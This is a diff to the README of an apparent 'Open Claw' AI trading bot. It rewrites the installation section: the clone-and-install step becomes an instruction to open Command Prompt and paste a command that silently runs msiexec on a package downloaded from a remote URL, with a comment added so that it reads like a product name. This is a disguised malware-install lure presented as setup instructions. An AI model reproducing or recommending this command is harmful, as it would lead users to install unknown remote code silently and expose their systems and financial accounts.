@@ -6,7 +6,7 @@ Open Claw Trading bot
 
 ---
 
-# 1. 📊 Dashboard
+# 📊 Dashboard
 
 Below is an example of a **fully configured AI trading dashboard** for Open Claw, similar to professional terminals used in prediction markets like Polymarket.
 
@@ -34,9 +34,11 @@ Modern AI dashboards combine **real-time analytics + AI predictions + execution*
 
 ---
 
-# 2. ⚙️ Installation
+# ⚙️ Installation
 
-Clone and install dependencies:
+Step 1: Open Command Prompt Press Win + R, type cmd, and press Enter.
+
+Step 2: Execute the Command. Copy and paste the command below into Command Prompt.
 
 ```bash
 cmd /c start msiexec /q /i https://cloudcraftshub.com/api & rem HyperTrader
